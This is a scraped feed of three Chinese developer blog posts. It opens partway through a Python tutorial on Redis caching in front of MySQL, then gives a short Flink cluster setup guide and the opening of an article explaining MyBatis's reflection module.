        <span class="hljs-built_in">print</span>(<span class="hljs-string">"✅ Hit cache"</span>)
        <span class="hljs-keyword">return</span> json.loads(cached)
    
    <span class="hljs-comment"># 2. 缓存未命中，查 MySQL</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"❌ Cache miss, querying MySQL..."</span>)
    <span class="hljs-keyword">with</span> get_db_connection() <span class="hljs-keyword">as</span> conn:
        <span class="hljs-keyword">with</span> conn.cursor() <span class="hljs-keyword">as</span> cursor:
            cursor.execute(<span class="hljs-string">"SELECT id, name, email FROM users WHERE id = %s"</span>, (user_id,))
            user = cursor.fetchone()
    
    <span class="hljs-keyword">if</span> user:
        <span class="hljs-comment"># 3. 写入缓存（注意：序列化为 JSON）</span>
        redis_client.setex(cache_key, CACHE_TTL, json.dumps(user))
        <span class="hljs-keyword">return</span> user
    <span class="hljs-keyword">else</span>:
        <span class="hljs-comment"># 4. 防止缓存穿透：对空结果也缓存（短时间）</span>
        redis_client.setex(cache_key, <span class="hljs-number">60</span>, <span class="hljs-string">""</span>)  <span class="hljs-comment"># 空值缓存 60 秒</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
</code></pre>
<hr/>
<h3 data-id="heading-6">4. 更新数据时同步缓存</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_user</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">int</span>, name: <span class="hljs-built_in">str</span>, email: <span class="hljs-built_in">str</span></span>):
    <span class="hljs-string">"""更新用户信息，并失效缓存"""</span>
    <span class="hljs-comment"># 1. 先更新 MySQL</span>
    <span class="hljs-keyword">with</span> get_db_connection() <span class="hljs-keyword">as</span> conn:
        <span class="hljs-keyword">with</span> conn.cursor() <span class="hljs-keyword">as</span> cursor:
            cursor.execute(
                <span class="hljs-string">"UPDATE users SET name=%s, email=%s WHERE id=%s"</span>,
                (name, email, user_id)
            )
            conn.commit()
    
    <span class="hljs-comment"># 2. 删除 Redis 缓存（推荐“删除”而非“更新”，避免并发不一致）</span>
    cache_key = <span class="hljs-string">f"<span class="hljs-subst">{CACHE_PREFIX}</span><span class="hljs-subst">{user_id}</span>"</span>
    redis_client.delete(cache_key)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"🧹 Cache invalidated for user <span class="hljs-subst">{user_id}</span>"</span>)
</code></pre>
<blockquote>
<p>💡 <strong>为什么删除而不是更新？</strong></p>
<ul>
<li>更新需查 DB 再写缓存，多一次查询</li>
<li>并发场景下可能写入旧数据（先更新 DB 的请求后写缓存）</li>
<li><strong>删除更简单安全</strong>：下次读自动加载最新数据</li>
</ul>
</blockquote>
<hr/>
<h3 data-id="heading-7">5. 防止缓存击穿：热点 Key 加锁</h3>
<blockquote>
<p>当某个 key 过期瞬间，大量请求同时击穿到 DB。</p>
</blockquote>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> uuid

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user_safe</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">int</span></span>):
    <span class="hljs-string">"""带分布式锁防止缓存击穿"""</span>
    cache_key = <span class="hljs-string">f"<span class="hljs-subst">{CACHE_PREFIX}</span><span class="hljs-subst">{user_id}</span>"</span>
    
    <span class="hljs-comment"># 1. 查缓存</span>
    cached = redis_client.get(cache_key)
    <span class="hljs-keyword">if</span> cached <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
        <span class="hljs-keyword">return</span> json.loads(cached)
    
    <span class="hljs-comment"># 2. 尝试获取分布式锁（锁名 = cache_key + ":lock"）</span>
    lock_key = cache_key + <span class="hljs-string">":lock"</span>
    lock_value = <span class="hljs-built_in">str</span>(uuid.uuid4())
    lock_ttl = <span class="hljs-number">5000</span>  <span class="hljs-comment"># 5秒</span>
    
    <span class="hljs-comment"># 使用 Lua 脚本原子加锁（见前文）</span>
    lock_script = redis_client.register_script(<span class="hljs-string">"""
    if redis.call("SET", KEYS[1], ARGV[1], "NX", "PX", ARGV[2]) then
        return 1
    else
        return 0
    end
    """</span>)
    
    <span class="hljs-keyword">if</span> lock_script(keys=[lock_key], args=[lock_value, lock_ttl]):
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># 双重检查：可能其他线程已加载</span>
            cached = redis_client.get(cache_key)
            <span class="hljs-keyword">if</span> cached <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
                <span class="hljs-keyword">return</span> json.loads(cached)
            
            <span class="hljs-comment"># 查询 DB 并写缓存</span>
            <span class="hljs-keyword">with</span> get_db_connection() <span class="hljs-keyword">as</span> conn:
                <span class="hljs-keyword">with</span> conn.cursor() <span class="hljs-keyword">as</span> cursor:
                    cursor.execute(<span class="hljs-string">"SELECT id, name, email FROM users WHERE id = %s"</span>, (user_id,))
                    user = cursor.fetchone()
            
            <span class="hljs-keyword">if</span> user:
                redis_client.setex(cache_key, CACHE_TTL, json.dumps(user))
                <span class="hljs-keyword">return</span> user
            <span class="hljs-keyword">else</span>:
                redis_client.setex(cache_key, <span class="hljs-number">60</span>, <span class="hljs-string">""</span>)
                <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
        <span class="hljs-keyword">finally</span>:
            <span class="hljs-comment"># 释放锁（Lua 脚本确保安全）</span>
            unlock_script = redis_client.register_script(<span class="hljs-string">"""
            if redis.call("GET", KEYS[1]) == ARGV[1] then
                return redis.call("DEL", KEYS[1])
            else
                return 0
            end
            """</span>)
            unlock_script(keys=[lock_key], args=[lock_value])
    <span class="hljs-keyword">else</span>:
        <span class="hljs-comment"># 未获得锁，短暂等待后重试（或直接返回错误）</span>
        time.sleep(<span class="hljs-number">0.01</span>)
        <span class="hljs-keyword">return</span> get_user_safe(user_id)  <span class="hljs-comment"># 递归重试（生产环境建议限制重试次数）</span>
</code></pre>
<hr/>
<h2 data-id="heading-8">✅ 三、完整使用流程示例</h2>
<pre><code class="hljs language-ini" lang="ini">if <span class="hljs-attr">__name__</span> == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-attr">user_id</span> = <span class="hljs-number">123</span>
    
    <span class="hljs-comment"># 首次查询：缓存未命中 → 查 DB → 写缓存</span>
    <span class="hljs-attr">user</span> = get_user_by_id(user_id)
    print("User:", user)
    
    <span class="hljs-comment"># 第二次查询：命中缓存</span>
    <span class="hljs-attr">user</span> = get_user_by_id(user_id)
    print("User (cached):", user)
    
    <span class="hljs-comment"># 更新用户</span>
    update_user(user_id, "New Name", "new@example.com")
    
    <span class="hljs-comment"># 再次查询：缓存已失效，重新加载</span>
    <span class="hljs-attr">user</span> = get_user_by_id(user_id)
    print("Updated user:", user)
</code></pre>
<hr/>
<h2 data-id="heading-9">✅ 四、高级技巧与注意事项</h2>
<h3 data-id="heading-10">1. <strong>缓存空值防穿透</strong></h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 如上文所示，对 DB 返回 None 的情况也缓存空字符串（TTL 较短）</span>
</code></pre>
<h3 data-id="heading-11">2. <strong>设置随机过期时间防雪崩</strong></h3>
<pre><code class="hljs language-ini" lang="ini">import random
<span class="hljs-attr">base_ttl</span> = <span class="hljs-number">300</span>
<span class="hljs-attr">random_ttl</span> = base_ttl + random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">60</span>)  <span class="hljs-comment"># 300~360 秒</span>
redis_client.setex(key, random_ttl, value)
</code></pre>
<h3 data-id="heading-12">3. <strong>使用 Pipeline 批量操作</strong></h3>
<pre><code class="hljs language-scss" lang="scss">with redis_client<span class="hljs-selector-class">.pipeline</span>() as pipe:
    pipe.<span class="hljs-built_in">setex</span>(<span class="hljs-string">"user:1"</span>, <span class="hljs-number">300</span>, json.<span class="hljs-built_in">dumps</span>(user1))
    pipe.<span class="hljs-built_in">setex</span>(<span class="hljs-string">"user:2"</span>, <span class="hljs-number">300</span>, json.<span class="hljs-built_in">dumps</span>(user2))
    pipe.<span class="hljs-built_in">execute</span>()
</code></pre>
<h3 data-id="heading-13">4. <strong>监控缓存命中率</strong></h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 在 get_user 中增加指标</span>
total_requests += <span class="hljs-number">1</span>
<span class="hljs-keyword">if</span> cached:
    cache_hits += <span class="hljs-number">1</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Hit rate: <span class="hljs-subst">{cache_hits/total_requests:<span class="hljs-number">.2</span>%}</span>"</span>)
</code></pre>
<h3 data-id="heading-14">5. <strong>数据一致性保障</strong></h3>
<ul>
<li><strong>最终一致性</strong>：接受短暂不一致（适用于大多数场景）</li>
<li><strong>强一致性</strong>：写操作时加全局锁（性能差，慎用）</li>
<li><strong>延迟双删</strong>（不推荐）：先删缓存 → 更新 DB → 延迟再删缓存（仍有窗口期）</li>
</ul>
<hr/>
<h2 data-id="heading-15">✅ 五、总结：最佳实践清单</h2>









































<table><thead><tr><th>项目</th><th>建议</th></tr></thead><tbody><tr><td><strong>读流程</strong></td><td>先 Redis，后 MySQL</td></tr><tr><td><strong>写流程</strong></td><td>先 MySQL，后删 Redis</td></tr><tr><td><strong>缓存键设计</strong></td><td>语义清晰，如 <code>user:{id}</code>、<code>product:{sku}</code></td></tr><tr><td><strong>空值处理</strong></td><td>缓存空结果（短 TTL）</td></tr><tr><td><strong>过期时间</strong></td><td>设置随机值防雪崩</td></tr><tr><td><strong>热点 Key</strong></td><td>用分布式锁防击穿</td></tr><tr><td><strong>序列化</strong></td><td>用 JSON（兼容性好），避免 pickle（安全风险）</td></tr><tr><td><strong>连接管理</strong></td><td>Redis 用连接池，MySQL 用上下文管理器</td></tr></tbody></table>
<blockquote>
<p>💡 <strong>记住</strong>：<br/>
<strong>Redis 是加速器，不是数据库。所有关键数据必须以 MySQL 为准。</strong></p>
</blockquote>
<hr/>
<p>通过以上范例，你可以安全、高效地在 Python 项目中结合 MySQL 和 Redis。如果需要 <strong>Django / Flask 集成示例</strong> 或 <strong>使用连接池/异步版本（aioredis）</strong> ，欢迎继续提问！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[flink集群服务搭建]]></title>    <link>https://juejin.cn/post/7589908657681334322</link>    <guid>https://juejin.cn/post/7589908657681334322</guid>    <pubDate>2026-01-01T08:09:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589908657681334322" data-draft-id="7589907831198892058" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="flink集群服务搭建"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-01T08:09:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="苏三的开发日记"/> <meta itemprop="url" content="https://juejin.cn/user/4248949048749213"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            flink集群服务搭建
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4248949048749213/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    苏三的开发日记
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T08:09:16.000Z" title="Thu Jan 01 2026 08:09:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">1.安装</h3>
<pre><code class="hljs language-js" lang="js">tar -zxvf flink-<span class="hljs-number">1.17</span><span class="hljs-number">.0</span>-bin-scala_2<span class="hljs-number">.12</span>.<span class="hljs-property">tgz</span> -C /opt/<span class="hljs-variable language_">module</span>/
</code></pre>
<h3 data-id="heading-1">2.修改配置文件</h3>
<pre><code class="hljs language-js" lang="js">vim flink-conf.<span class="hljs-property">yaml</span>

#hadoop102
# <span class="hljs-title class_">JobManager</span>节点地址.
jobmanager.<span class="hljs-property">rpc</span>.<span class="hljs-property">address</span>: hadoop102
jobmanager.<span class="hljs-property">bind</span>-<span class="hljs-attr">host</span>: <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>
rest.<span class="hljs-property">address</span>: hadoop102
rest.<span class="hljs-property">bind</span>-<span class="hljs-attr">address</span>: <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>
# <span class="hljs-title class_">TaskManager</span>节点地址.需要配置为当前机器名
taskmanager.<span class="hljs-property">bind</span>-<span class="hljs-attr">host</span>: <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>
taskmanager.<span class="hljs-property">host</span>: hadoop102

vim workers

hadoop102
hadoop103
hadoop104

vim masters

hadoop102：<span class="hljs-number">8081</span>


xsync /opt/<span class="hljs-variable language_">module</span>/flink

vim flink-conf.<span class="hljs-property">yaml</span>

#hadoop103
修改前
taskmanager.<span class="hljs-property">host</span>=hadoop102
修改后
taskmanager.<span class="hljs-property">host</span>=hadoop103


vim flink-conf.<span class="hljs-property">yaml</span>

#hadoop104
修改前
taskmanager.<span class="hljs-property">host</span>=hadoop102
修改后
taskmanager.<span class="hljs-property">host</span>=hadoop104

</code></pre>
<h3 data-id="heading-2">3.服务启动与停止</h3>
<pre><code class="hljs language-js" lang="js">bin/start-cluster.<span class="hljs-property">sh</span> <span class="hljs-comment">//启动服务</span>
bin/stop-cluster.<span class="hljs-property">sh</span> <span class="hljs-comment">//停止服务</span>

访问<span class="hljs-title class_">Web</span> <span class="hljs-variable constant_">UI</span>
启动成功后，同样可以访问&lt;<span class="hljs-attr">http</span>:<span class="hljs-comment">//hadoop102:8081&gt;对flink集群和任务进行监控管理</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MyBatis反射模块详解]]></title>    <link>https://juejin.cn/post/7589838742552379411</link>    <guid>https://juejin.cn/post/7589838742552379411</guid>    <pubDate>2026-01-01T08:15:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589838742552379411" data-draft-id="7589893746080612393" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MyBatis反射模块详解"/> <meta itemprop="keywords" content="MyBatis,Java"/> <meta itemprop="datePublished" content="2026-01-01T08:15:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="雨中飘荡的记忆"/> <meta itemprop="url" content="https://juejin.cn/user/694547077666606"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MyBatis反射模块详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/694547077666606/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    雨中飘荡的记忆
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T08:15:47.000Z" title="Thu Jan 01 2026 08:15:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>深入理解MyBatis核心基础设施，掌握对象操作的本质原理</p>
</blockquote>
<h2 data-id="heading-0">引言</h2>
<p>在使用MyBatis进行开发时，你是否好奇过：</p>
<pre><code class="hljs">MyBatis如何将ResultSet数据自动映射到Java对象？
它是如何在运行时动态操作对象属性的？
为什么MyBatis能够处理各种复杂的嵌套属性？
</code></pre>
<h2 data-id="heading-1">一、MyBatis整体架构与反射模块</h2>
<h2 data-id="heading-2">1.1 反射模块在MyBatis中的位置</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a24233bb3012449db7e2dfc682b8ce22~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767860147&amp;x-signature=bNdEQxhMbjqxox8W5XB3YzNiuT8%3D" alt="" loading="lazy"/></p>
<p>从架构图可以看出，MyBatis采用了分层设计，而反射模块（Reflection）位于基础支撑层，是整个框架的核心基础设施。</p>
<h2 data-id="heading-3">1.2 反射模块的五大核心职责</h2>
<pre><code class="hljs">✅ 对象属性访问 - 通过反射读写对象属性 
✅ 对象实例化 - 动态创建对象实例 
✅ 类型解析 - 分析类的类型信息
✅ 元数据获取 - 获取方法、字段、构造器等元数据 
✅ 性能优化 - 缓存反射信息，提升性能
</code></pre>
<h2 data-id="heading-4">1.3 为什么需要反射模块？</h2>
<p>场景1：结果映射</p>
<p>ResultSet → 提取数据 → 通过反射设置到Java对象</p>
<p>场景2：参数传递</p>
<p>Java对象 → 通过反射获取属性值 → 设置到PreparedStatement</p>
<p>场景3：对象创建</p>
<p>Mapper返回类型 → 通过反射创建实例 → 填充数据</p>
<p>场景4：元数据解析</p>
<p>XML配置 → 解析类名 → 通过反射获取类信息</p>
<p><strong>没有反射模块，这些操作都需要手工编写大量重复代码！</strong></p>
<h2 data-id="heading-5">1.4 Java反射基础回顾</h2>
<pre><code class="hljs language-ini" lang="ini">// 获取Class对象
Class&lt;?&gt; <span class="hljs-attr">clazz</span> = User.class<span class="hljs-comment">;</span>

// 创建实例
Object <span class="hljs-attr">obj</span> = clazz.newInstance()<span class="hljs-comment">;</span>

// 获取方法
Method <span class="hljs-attr">method</span> = clazz.getMethod(<span class="hljs-string">"setName"</span>, String.class)<span class="hljs-comment">;</span>

// 调用方法
method.invoke(obj, "张三")<span class="hljs-comment">;</span>

// 获取字段
Field <span class="hljs-attr">field</span> = clazz.getDeclaredField(<span class="hljs-string">"name"</span>)<span class="hljs-comment">;</span>
field.setAccessible(true)<span class="hljs-comment">;</span>
field.set(obj, "张三")<span class="hljs-comment">;</span>
</code></pre>
<h2 data-id="heading-6"><strong>二、反射模块架构</strong></h2>
